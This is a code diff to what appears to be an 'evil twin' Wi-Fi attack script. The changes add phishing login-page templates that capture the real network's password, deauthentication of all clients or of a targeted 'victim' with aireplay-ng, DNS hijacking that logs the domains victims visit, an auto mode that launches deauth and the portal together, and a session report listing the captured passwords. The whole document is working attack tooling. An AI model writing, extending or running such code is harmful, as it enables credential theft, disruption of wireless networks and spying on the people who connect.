@@ -49,6 +49,7 @@ DHCPD_CONF="/etc/dhcp/et-auto-dhcpd.conf"
 DHCPD_LEASES="/var/lib/dhcp/dhcpd.leases-et-auto"
 AP_IFACE=""
 MON_IFACE=""
+START_TIME=""
 
 ###########################################
 # Get information of the chipset.
@@ -798,6 +799,7 @@ HTTP_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
 AP_IFACE = sys.argv[4] if len(sys.argv) > 4 else "at0"
 REAL_BSSID = sys.argv[5] if len(sys.argv) > 5 else ""
 LEASES = sys.argv[6] if len(sys.argv) > 6 else "/var/lib/dhcp/dhcpd.leases-et-auto"
+TEMPLATE_FILE = sys.argv[7] if len(sys.argv) > 7 else ""
 HTTPS_PORT = 443
 VERIFY_IFACE = "verify0"
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -812,26 +814,29 @@ if not os.path.exists(CERT_FILE):
                 "-subj", "/C=XX/ST=XX/L=XX/O=XX/CN=192.168.3.1"],
                stdout=open(os.devnull, "wb"), stderr=open(os.devnull, "wb"))
 
-LOGIN_PAGE = """<!DOCTYPE html>
+if TEMPLATE_FILE and os.path.exists(TEMPLATE_FILE):
+    LOGIN_PAGE = open(TEMPLATE_FILE).read()
+else:
+    LOGIN_PAGE = """<!DOCTYPE html>
 <html>
 <head><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Sign in to {essid}</title>
 <style>
-* {{ margin: 0; padding: 0; box-sizing: border-box; }}
-body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
-.card {{ background: white; border-radius: 14px; padding: 30px; margin: 20px; max-width: 380px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.08); text-align: center; }}
-.icon {{ font-size: 48px; margin-bottom: 12px; }}
-h2 {{ font-size: 20px; font-weight: 600; color: #1c1c1e; margin-bottom: 6px; }}
-p {{ font-size: 14px; color: #8e8e93; margin-bottom: 24px; }}
-input {{ width: 100%; padding: 14px 16px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 16px; outline: none; transition: border 0.2s; }}
-input:focus {{ border-color: #007aff; }}
-button {{ width: 100%; padding: 14px; background: #007aff; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; }}
-button:hover {{ background: #0056b3; }}
-.error {{ color: #ff3b30; font-size: 13px; margin-top: 8px; display: none; }}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+.card { background: white; border-radius: 14px; padding: 30px; margin: 20px; max-width: 380px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.08); text-align: center; }
+.icon { font-size: 48px; margin-bottom: 12px; }
+h2 { font-size: 20px; font-weight: 600; color: #1c1c1e; margin-bottom: 6px; }
+p { font-size: 14px; color: #8e8e93; margin-bottom: 24px; }
+input { width: 100%; padding: 14px 16px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 16px; outline: none; transition: border 0.2s; }
+input:focus { border-color: #007aff; }
+button { width: 100%; padding: 14px; background: #007aff; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; }
+button:hover { background: #0056b3; }
+.error { color: #ff3b30; font-size: 13px; margin-top: 8px; display: none; }
 </style></head>
 <body>
 <div class="card">
-<div class="icon">🔒</div>
+<div class="icon">&#128274;</div>
 <h2>"{essid}" Requires a Password</h2>
 <p>Enter the network password to connect</p>
 <form method="POST" action="/" onsubmit="document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='Connecting...'">
@@ -920,7 +925,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.send_header("Cache-Control", "no-cache")
         self.end_headers()
-        self.wfile.write(LOGIN_PAGE.format(essid=ESSID).encode("utf-8"))
+        self.wfile.write(LOGIN_PAGE.replace("{essid}", ESSID).encode("utf-8"))
 
     def do_POST(self):
         global AUTHED
@@ -950,7 +955,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_header("Content-type", "text/html; charset=utf-8")
             self.send_header("Cache-Control", "no-cache")
             self.end_headers()
-            page = LOGIN_PAGE.format(essid=ESSID).replace("display: none", "display: block")
+            page = LOGIN_PAGE.replace("{essid}", ESSID).replace("display: none", "display: block")
             self.wfile.write(page.encode("utf-8"))
             return
 
@@ -1023,6 +1028,7 @@ notify_clients() {
                     ;;
                 *)
                     known_macs="${known_macs} ${mac}"
+                    iptables -I FORWARD 1 -m mac --mac-source "${mac}" -j ACCEPT 2>/dev/null || true
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Client connected: ${BOLD_YELLOW}${mac}${GREEN} got ${BOLD_CYAN}${ip}${host:+${GREEN} (${host})}${WHITE}"
                     echo -ne "${YELLOW}>>${WHITE} "
@@ -1033,9 +1039,177 @@ notify_clients() {
     done
 }
 
+###########################################
+# Show clients connected to the fake AP
+# with signal strength and traffic counters.
+# Globals:
+#   AP_IFACE, DHCPD_LEASES
+# Arguments:
+#   None
+# Returns:
+#   None
+###########################################
+show_clients() {
+    local sta_out=""
+    if [ -n "${AP_IFACE}" ] && [ -x "$(command -v hostapd_cli 2>&1)" ]; then
+        sta_out=$(hostapd_cli -p /var/run/hostapd -i "${AP_IFACE}" all_sta 2>/dev/null)
+    fi
+    awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /client-hostname/{host=$2; gsub(/[;"]+/,"",host)} /^}/{if(mac!="") print mac, ip, host; mac=""; ip=""; host=""}' "${DHCPD_LEASES}" 2>/dev/null | \
+    while read -r mac ip host; do
+        local signal=""
+        if [ -n "${sta_out}" ]; then
+            signal=$(echo "${sta_out}" | awk -v m="${mac}" '$0==m":" {f=1; next} f==1 && /^signal=/{print substr($0,8); exit} f==1 && /:$/ {f=0}')
+        fi
+        local traffic=$(iptables -L FORWARD -n -v 2>/dev/null | awk -v m="${mac}" '$0 ~ m {print $1, $2; exit}')
+        echo "  ${mac}  ${ip}  ${host}  signal:${signal:--}  sent:${traffic:-0 pkts}"
+    done
+}
+
+###########################################
+# Start the captive portal. With an empty
+# argument, ask which login page to use.
+# Globals:
+#   portal_running
+# Arguments:
+#   template_file (optional, "" = ask)
+# Returns:
+#   None
+###########################################
+start_portal() {
+    local tpl="${1:-}"
+    if [ "${portal_running}" == true ]; then
+        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Captive portal already running.${WHITE}"
+        echo ""
+        return
+    fi
+    if [ -z "${tpl}" ]; then
+        local templates=()
+        local f
+        for f in "${SCRIPT_DIR}"/templates/*.html; do
+            [ -f "${f}" ] && templates+=("${f}")
+        done
+        if [ "${#templates[@]}" -ge 1 ]; then
+            echo -e "${WHITE}[${CYAN}?${WHITE}]${GREEN} Login page:${WHITE}"
+            local i=1
+            for f in "${templates[@]}"; do
+                echo -e "  ${BOLD_YELLOW}${i})${WHITE} $(basename "${f}" .html)"
+                i=$((i + 1))
+            done
+            echo -e -n "${RED}[${CYAN}!${RED}]${WHITE} Select the ${BOLD_RED}number${WHITE} ${WHITE}[${GREEN}1${WHITE}-${GREEN}${#templates[@]}${WHITE}] (${BOLD_YELLOW}q${WHITE}=quit): ${GREEN}"
+            read tpl_choice
+            case "${tpl_choice}" in
+                q|Q)
+                    quit_now
+                    ;;
+            esac
+            if [[ "${tpl_choice}" =~ ^[0-9]+$ ]] && [ "${tpl_choice}" -ge 1 ] && [ "${tpl_choice}" -le "${#templates[@]}" ]; then
+                tpl="${templates[$((tpl_choice-1))]}"
+            else
+                tpl=""
+            fi
+            echo ""
+        fi
+    fi
+    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal...${WHITE}"
+    create_captive_portal "${selected_essid}"
+
+    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 80 -j REDIRECT --to-port 80
+    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 443 -j REDIRECT --to-port 443
+    iptables -t nat -A PREROUTING -i "${wlan}" -p udp --dport 53 -j REDIRECT --to-port 53
+    iptables -I INPUT 1 -i "${wlan}" -j ACCEPT
+
+    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log ${DNS}" "dns_server"
+    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan} ${selected_bssid} ${DHCPD_LEASES} \"${tpl}\"" "captive_portal"
+
+    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
+    portal_running=true
+    echo ""
+}
+
+###########################################
+# Create the monitor VAP used for deauth.
+# Globals:
+#   MON_IFACE
+# Arguments:
+#   None
+# Returns:
+#   None
+###########################################
+ensure_monitor_iface() {
+    if [ -z "${MON_IFACE}" ]; then
+        MON_IFACE="mon0"
+        local mon_n=0
+        while ip -o link show "${MON_IFACE}" &>/dev/null; do
+            mon_n=$((mon_n + 1))
+            MON_IFACE="mon${mon_n}"
+        done
+        iw dev "${wlan}" interface add "${MON_IFACE}" type monitor
+        ip link set "${MON_IFACE}" up
+    fi
+    iw dev "${MON_IFACE}" set channel ${selected_channel} 2>/dev/null || iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
+}
+
+start_deauth_all() {
+    ensure_monitor_iface
+    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing all clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+    deauth_running=true
+}
+
+start_deauth_targeted() {
+    local dmac="${1}"
+    ensure_monitor_iface
+    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Targeted deauth of ${BOLD_YELLOW}${dmac}${GREEN} from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+    run_background "aireplay-ng -0 0 -a ${selected_bssid} -c ${dmac} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+    deauth_running=true
+}
+
+stop_deauth() {
+    pkill -f "aireplay-ng" 2>/dev/null || true
+    if [ -n "${MON_IFACE}" ]; then
+        ip link set "${MON_IFACE}" down 2>/dev/null || true
+        iw dev "${MON_IFACE}" del 2>/dev/null || true
+        MON_IFACE=""
+    fi
+    deauth_running=false
+    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Deauth stopped. Clients can reconnect now (press ${BOLD_YELLOW}d${GREEN} to deauth again).${WHITE}"
+    echo ""
+}
+
 cleanup() {
     echo ""
     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Cleaning up...${WHITE}"
+
+    if [ -n "${START_TIME:-}" ] && [ -d "${TMP_DIR}" ]; then
+        {
+            echo "===== EVIL TWIN SESSION REPORT ====="
+            echo "Started: ${TMP_DIR##*/session-}"
+            echo "Duration: $(( ($(date +%s) - START_TIME) / 60 )) min"
+            if [ -n "${selected_essid:-}" ]; then
+                echo "Fake AP: ${selected_essid} (channel ${selected_channel}, iface ${AP_IFACE:-none})"
+                echo "Internet via: ${lan:-none}"
+            fi
+            echo ""
+            echo "--- Clients ---"
+            show_clients
+            echo ""
+            echo "--- Passwords ---"
+            if [ -s "${TMP_DIR}/passwords.txt" ]; then
+                cat "${TMP_DIR}/passwords.txt"
+            else
+                echo "(none captured)"
+            fi
+            echo ""
+            echo "--- Domains visited ---"
+            if [ -f "${TMP_DIR}/dns_server.log" ]; then
+                echo "Total lookups: $(grep -c 'visit' "${TMP_DIR}/dns_server.log" 2>/dev/null || echo 0)"
+                grep 'visit' "${TMP_DIR}/dns_server.log" 2>/dev/null | awk '{print $4}' | sort | uniq -c | sort -rn | head -15
+            else
+                echo "(portal not used)"
+            fi
+        } > "${TMP_DIR}/report.txt" 2>/dev/null
+    fi
+
     pkill -f "hostapd" 2>/dev/null || true
     pkill -f "airbase-ng" 2>/dev/null || true
     pkill -f "aireplay-ng" 2>/dev/null || true
@@ -1069,6 +1243,11 @@ cleanup() {
         ip link set dev "${AP_IFACE}" up 2>/dev/null || true
         nmcli device set "${AP_IFACE}" managed yes 2>/dev/null || true
     fi
+    if [ -f "${DHCPD_LEASES}" ]; then
+        for mac in $(awk '/hardware ethernet/{mac=$3; gsub(/;/,"",mac); if(mac!="") print mac}' "${DHCPD_LEASES}" 2>/dev/null | sort -u); do
+            iptables -D FORWARD -m mac --mac-source "${mac}" -j ACCEPT 2>/dev/null || true
+        done
+    fi
     rm -f "${DHCPD_CONF}" "${DHCPD_LEASES}" 2>/dev/null || true
     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Done.${WHITE}"
     if [ -s "${TMP_DIR}/passwords.txt" ]; then
@@ -1076,6 +1255,9 @@ cleanup() {
         echo -e "${WHITE}[${YELLOW}!${WHITE}]${BOLD_GREEN} Captured passwords:${WHITE}"
         cat "${TMP_DIR}/passwords.txt"
         echo ""
+    fi
+    if [ -f "${TMP_DIR}/report.txt" ]; then
+        echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Session report: ${BOLD_CYAN}${TMP_DIR}/report.txt${WHITE}"
     fi
     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Session saved: ${BOLD_CYAN}${TMP_DIR}${WHITE}"
     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} All sessions kept in ${BOLD_CYAN}${SCRIPT_DIR}/tmp${GREEN}, latest via ${BOLD_CYAN}${SCRIPT_DIR}/tmp/latest${WHITE}"
@@ -1090,6 +1272,7 @@ main() {
     fi
     trap cleanup EXIT
     trap 'exit 130' INT TERM
+    START_TIME=$(date +%s)
     local result='main'
     while [ "${result}" == 'main' ];
     do
@@ -1156,6 +1339,14 @@ main() {
                         continue
                     fi
                     select_internet_interface
+                    local auto_mode=false
+                    echo -e -n "${WHITE}[${CYAN}?${WHITE}]${GREEN} Auto-start deauth + captive portal when the AP is up? ${WHITE}[${GREEN}y${WHITE}/${RED}N${WHITE}]: "
+                    read auto_answer
+                    case "${auto_answer}" in
+                        y|Y)
+                            auto_mode=true
+                            ;;
+                    esac
                     clear
                     print_header
                     echo ""
@@ -1176,6 +1367,7 @@ auth_algs=1
 ignore_broadcast_ssid=0
 ieee80211n=1
 wmm_enabled=1
+ctrl_interface=/var/run/hostapd
 HCONF
 
                     run_background "hostapd ${TMP_DIR}/hostapd.conf" "hostapd"
@@ -1240,6 +1432,18 @@ HCONF
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[c]${GREEN}aptive portal ${WHITE}| ${BOLD_YELLOW}[v]${GREEN}ictims ${WHITE}| ${BOLD_YELLOW}[t]${GREEN}raffic capture ${WHITE}| ${BOLD_YELLOW}[s]${GREEN}tatus ${WHITE}| ${BOLD_YELLOW}[b]${GREEN}ack ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
                     deauth_running=false
                     portal_running=false
+                    if [ "${auto_mode}" == true ]; then
+                        local auto_tpl=""
+                        local tf
+                        for tf in "${SCRIPT_DIR}"/templates/*.html; do
+                            if [ -f "${tf}" ]; then
+                                auto_tpl="${tf}"
+                                break
+                            fi
+                        done
+                        start_deauth_all
+                        start_portal "${auto_tpl}"
+                    fi
                     while true; do
                         echo -e -n "${YELLOW}>>${WHITE} "
                         read -n 1 cmd
@@ -1247,71 +1451,31 @@ HCONF
                         case "${cmd}" in
                             d|D)
                                 if [ "${deauth_running}" == true ]; then
-                                    pkill -f "aireplay-ng" 2>/dev/null || true
-                                    if [ -n "${MON_IFACE}" ]; then
-                                        ip link set "${MON_IFACE}" down 2>/dev/null || true
-                                        iw dev "${MON_IFACE}" del 2>/dev/null || true
-                                        MON_IFACE=""
-                                    fi
-                                    deauth_running=false
-                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Deauth stopped. Clients can reconnect now (press ${BOLD_YELLOW}d${GREEN} to deauth again).${WHITE}"
-                                    echo ""
+                                    stop_deauth
                                 else
                                     echo -e "${WHITE}[${CYAN}?${WHITE}]${GREEN} Deauth mode: ${BOLD_YELLOW}[a]${GREEN}ll clients ${WHITE}| ${BOLD_YELLOW}[t]${GREEN}arget one victim${WHITE}: "
                                     read -n 1 dmode
                                     echo ""
-                                    local dmac=""
                                     if [ "${dmode}" == "t" ] || [ "${dmode}" == "T" ]; then
                                         echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Clients already on the fake AP (do not deauth these):${WHITE}"
-                                        awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /^}/{if(mac!="") print "  " mac "  " ip; mac=""; ip=""}' "${DHCPD_LEASES}" 2>/dev/null
+                                        show_clients
+                                        echo ""
                                         echo -e -n "${RED}[${CYAN}!${RED}]${WHITE} Enter the ${BOLD_RED}MAC${WHITE} of the victim on the real AP (e.g. ${GREEN}9e:94:92:fb:ec:04${WHITE}): ${GREEN}"
                                         read dmac
-                                        if ! [[ "${dmac}" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
+                                        if [[ "${dmac}" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
+                                            start_deauth_targeted "${dmac}"
+                                        else
                                             echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Invalid MAC address.${WHITE}"
-                                            echo ""
-                                            continue
                                         fi
-                                    fi
-                                    if [ -z "${MON_IFACE}" ]; then
-                                        MON_IFACE="mon0"
-                                        local mon_n=0
-                                        while ip -o link show "${MON_IFACE}" &>/dev/null; do
-                                            mon_n=$((mon_n + 1))
-                                            MON_IFACE="mon${mon_n}"
-                                        done
-                                        iw dev "${wlan}" interface add "${MON_IFACE}" type monitor
-                                        ip link set "${MON_IFACE}" up
-                                    fi
-                                    iw dev "${MON_IFACE}" set channel ${selected_channel} 2>/dev/null || iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
-                                    if [ -n "${dmac}" ]; then
-                                        echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Targeted deauth of ${BOLD_YELLOW}${dmac}${GREEN} from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
-                                        run_background "aireplay-ng -0 0 -a ${selected_bssid} -c ${dmac} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+                                        echo ""
                                     else
-                                        echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing all clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
-                                        run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+                                        start_deauth_all
+                                        echo ""
                                     fi
-                                    deauth_running=true
-                                    echo ""
                                 fi
                                 ;;
                             c|C)
-                                if [ "${portal_running}" == false ]; then
-                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal...${WHITE}"
-                                    create_captive_portal "${selected_essid}"
-
-                                    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 80 -j REDIRECT --to-port 80
-                                    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 443 -j REDIRECT --to-port 443
-                                    iptables -t nat -A PREROUTING -i "${wlan}" -p udp --dport 53 -j REDIRECT --to-port 53
-                                    iptables -I INPUT 1 -i "${wlan}" -j ACCEPT
-
-                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log ${DNS}" "dns_server"
-                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan} ${selected_bssid} ${DHCPD_LEASES}" "captive_portal"
-
-                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
-                                    portal_running=true
-                                else
-                                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Captive portal already running.${WHITE}"
-                                fi
+                                start_portal ""
                                 ;;
                             v|V)
                                 echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Victim activity (DNS lookups, newest last):${WHITE}"
@@ -1346,8 +1510,14 @@ HCONF
                                 echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} iptables FORWARD:${WHITE}"
                                 iptables -L FORWARD -n -v 2>/dev/null
                                 echo ""
-                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} DHCP clients:${WHITE}"
-                                awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /client-hostname/{host=$2; gsub(/[;"]+/,"",host)} /^}/{if(mac!="") print "  " mac "  " ip "  " host; mac=""; ip=""; host=""}' "${DHCPD_LEASES}" 2>/dev/null
+                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Clients on the fake AP:${WHITE}"
+                                local clients_out
+                                clients_out=$(show_clients)
+                                if [ -n "${clients_out}" ]; then
+                                    echo "${clients_out}"
+                                else
+                                    echo -e "${WHITE}  none${WHITE}"
+                                fi
                                 echo ""
                                 if [ "${portal_running}" == true ]; then
                                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal: ${BOLD_YELLOW}running${WHITE}"
